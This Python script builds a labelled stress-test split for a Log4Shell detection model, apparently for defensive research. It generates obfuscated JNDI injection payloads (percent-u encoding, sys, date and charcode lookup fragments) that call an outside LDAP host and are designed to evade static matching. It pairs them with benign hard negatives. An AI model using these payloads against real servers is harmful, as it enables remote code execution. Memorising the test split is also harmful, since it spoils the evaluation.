#!/usr/bin/env python3
"""Build a frozen-model out-of-distribution stress test split."""

from __future__ import annotations

import argparse
import csv
import json
import random
from pathlib import Path

try:
    import _bootstrap  # noqa: F401
except ModuleNotFoundError:  # pragma: no cover
    from scripts import _bootstrap  # noqa: F401
import pandas as pd

from detector.paths import METADATA_DIR, PROCESSED_DATA_DIR

try:
    from build_dataset import HOSTS, _record
except ImportError:  # pragma: no cover - used when imported as scripts.build_ood_stress_test
    from scripts.build_dataset import HOSTS, _record


OOD_SPLIT = "ood_stress_test"
OOD_FILE = "ood_stress_test.csv"


def _contextualize(payload: str, field: str, host: str, idx: int) -> str:
    if field == "query":
        return f"GET /api/audit?trace={payload}&request_id=ood-{idx} HTTP/1.1 Host: victim.local"
    if field == "json":
        return f'POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {{"ua":"{payload}","host":"{host}"}}'
    if field == "header":
        return f"Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.{idx % 250} | X-Api-Version: {payload}"
    if field == "cookie":
        return f"GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking={payload}; sid=ood{idx}"
    return payload


def _malicious_payloads() -> list[tuple[str, str]]:
    rows: list[tuple[str, str]] = []
    for host in HOSTS:
        rows.extend(
            [
                (
                    f"%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002F{host}%u002Fpercent-u%u007D",
                    "iis_percent_u_encoding",
                ),
                (
                    f"${{j${{sys:line.separator}}ndi:ldap://{host}/sys-separator}}",
                    "sys_lookup_separator",
                ),
                (
                    f"${{j${{k8s:k5:-n}}d${{sd:k5:-i}}:ldap://{host}/unsupported-namespace}}",
                    "unsupported_lookup_namespace",
                ),
                (
                    f"${{${{date:yyyy:-j}}${{date:MM:-n}}${{date:dd:-d}}${{date:HH:-i}}:ldap://{host}/date-fragment}}",
                    "date_lookup_reconstruction",
                ),
                (
                    f"${{${{chr:106}}${{chr:110}}${{chr:100}}${{chr:105}}:ldap://{host}/charcode}}",
                    "charcode_lookup_reconstruction",
                ),
                (
                    f"${{jndi:l${{sys:user.name:-d}}ap://{host}/protocol-sys}}",
                    "protocol_fragment_sys_lookup",
                ),
            ]
        )
    return rows


def _benign_logs() -> list[tuple[str, str]]:
    examples: list[tuple[str, str]] = []
    for host in HOSTS:
        encoded = f"%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002F{host}%u002Fdoc%u007D"
        examples.extend(
            [
                (
                    f"GET /docs/log4shell?example={encoded}&mode=render-only HTTP/1.1 Host: kb.local",
                    "benign_percent_u_documentation",
                ),
                (
                    "DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false",
                    "benign_base64_artifact",
                ),
                (
                    f'INFO rendered JSON string value="\\\\${{jndi:ldap://{host}/not-executed}}" source=documentation',
                    "benign_json_escaped_payload",
                ),
                (
                    f"INFO tutorial says type ${{ then jndi then :ldap://{host} separately; not a runtime lookup",
                    "benign_fragmented_tutorial_text",
                ),
                (
                    f"WARN unit-test fixture expected='${{jndi:ldap://{host}/fixture}}' assertion=string_literal_only",
                    "benign_unit_test_fixture",
                ),
                (
                    f"GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2F{host}%2Fresearch%7D&intent=research HTTP/1.1",
                    "benign_encoded_search_query",
                ),
            ]
        )
    return examples


def build_ood_stress_test(samples_per_variant: int = 4, seed: int = 31415) -> pd.DataFrame:
    random.seed(seed)
    PROCESSED_DATA_DIR.mkdir(parents=True, exist_ok=True)
    fields = ["query", "json", "header", "cookie"]
    rows: list[dict[str, object]] = []
    idx = 900000

    for payload, obfuscation_type in _malicious_payloads():
        host = next((candidate for candidate in HOSTS if candidate in payload), "unknown-host")
        for sample_idx in range(samples_per_variant):
            idx += 1
            field = fields[sample_idx % len(fields)]
            raw_log = _contextualize(payload, field, host, idx)
            row = _record(idx, "ood_stress_malicious", raw_log, 1, "log4shell", field, OOD_SPLIT, "critical", obfuscation_type)
            row["id"] = f"OOD-{idx:06d}"
            rows.append(row)

    benign_templates = _benign_logs()
    for raw_log, obfuscation_type in benign_templates:
        for sample_idx in range(samples_per_variant):
            idx += 1
            suffix = f" trace_id=benign-ood-{idx}" if sample_idx else ""
            row = _record(idx, "ood_stress_hard_negative", raw_log + suffix, 0, obfuscation_type, "mixed", OOD_SPLIT, "low", obfuscation_type)
            row["id"] = f"OOD-{idx:06d}"
            rows.append(row)

    random.shuffle(rows)
    df = pd.DataFrame(rows)
    df.to_csv(PROCESSED_DATA_DIR / OOD_FILE, index=False, quoting=csv.QUOTE_MINIMAL)
    _update_metadata(df)
    return df


def _update_metadata(df: pd.DataFrame) -> None:
    METADATA_DIR.mkdir(parents=True, exist_ok=True)
    stats_path = METADATA_DIR / "dataset_stats.json"
    if stats_path.exists():
        stats = json.loads(stats_path.read_text(encoding="utf-8"))
    else:
        stats = {"by_split": {}, "by_label": {}, "by_source": {}, "by_obfuscation_type": {}, "schema": list(df.columns)}
    stats["by_split"][OOD_SPLIT] = int(len(df))
    stats["by_source"]["ood_stress_malicious"] = int((df["source"] == "ood_stress_malicious").sum())
    stats["by_source"]["ood_stress_hard_negative"] = int((df["source"] == "ood_stress_hard_negative").sum())
    for key, value in df["obfuscation_type"].value_counts().to_dict().items():
        stats["by_obfuscation_type"][key] = int(value)
    stats["total_rows"] = int(sum(stats.get("by_split", {}).values()))
    stats_path.write_text(json.dumps(stats, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    taxonomy_path = METADATA_DIR / "obfuscation_taxonomy.json"
    taxonomy = json.loads(taxonomy_path.read_text(encoding="utf-8")) if taxonomy_path.exists() else {}
    taxonomy.update(
        {
            "iis_percent_u_encoding": "Non-standard %u00xx style URL encoding commonly seen in logs and web stacks.",
            "sys_lookup_separator": "System lookup inserted into the JNDI token to disrupt static token matching.",
            "unsupported_lookup_namespace": "Unseen namespace-style lookup fragments placed inside the JNDI token.",
            "date_lookup_reconstruction": "Date lookup fragments used to reconstruct the JNDI token.",
            "charcode_lookup_reconstruction": "Character-code style lookup fragments used as an OOD reconstruction probe.",
            "protocol_fragment_sys_lookup": "Protocol token fragmented with a system-style lookup expression.",
            "benign_percent_u_documentation": "Documentation/search text containing encoded payload examples that should remain benign.",
            "benign_base64_artifact": "Base64-encoded payload text stored as a display-only artifact.",
            "benign_json_escaped_payload": "Escaped JSON string containing a payload example, not runtime input.",
            "benign_fragmented_tutorial_text": "Tutorial text that mentions payload components separately.",
            "benign_unit_test_fixture": "Literal unit-test fixture containing a payload string.",
            "benign_encoded_search_query": "Encoded research/search query that contains a payload example.",
        }
    )
    taxonomy_path.write_text(json.dumps(taxonomy, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    strategy_path = METADATA_DIR / "split_strategy.json"
    strategy = json.loads(strategy_path.read_text(encoding="utf-8")) if strategy_path.exists() else {}
    strategy[OOD_SPLIT] = [
        "frozen_model_only",
        "new_lookup_namespaces",
        "percent_u_encoding",
        "benign_encoded_payload_examples",
        "balanced_malicious_and_hard_negative_rows",
    ]
    strategy_path.write_text(json.dumps(strategy, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    sources_path = METADATA_DIR / "dataset_sources.json"
    sources = json.loads(sources_path.read_text(encoding="utf-8")) if sources_path.exists() else {}
    sources["ood_stress_test"] = (
        "Frozen-model stress split generated by scripts/build_ood_stress_test.py. "
        "It is not used for training, validation, regex tuning, or threshold calibration."
    )
    sources_path.write_text(json.dumps(sources, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def main() -> None:
    parser = argparse.ArgumentParser(description="Build frozen-model OOD stress-test data")
    parser.add_argument("--samples-per-variant", type=int, default=4)
    parser.add_argument("--seed", type=int, default=31415)
    args = parser.parse_args()
    df = build_ood_stress_test(samples_per_variant=args.samples_per_variant, seed=args.seed)
    print(f"[+] Built {len(df)} OOD stress rows in {PROCESSED_DATA_DIR / OOD_FILE}")


if __name__ == "__main__":
    main()
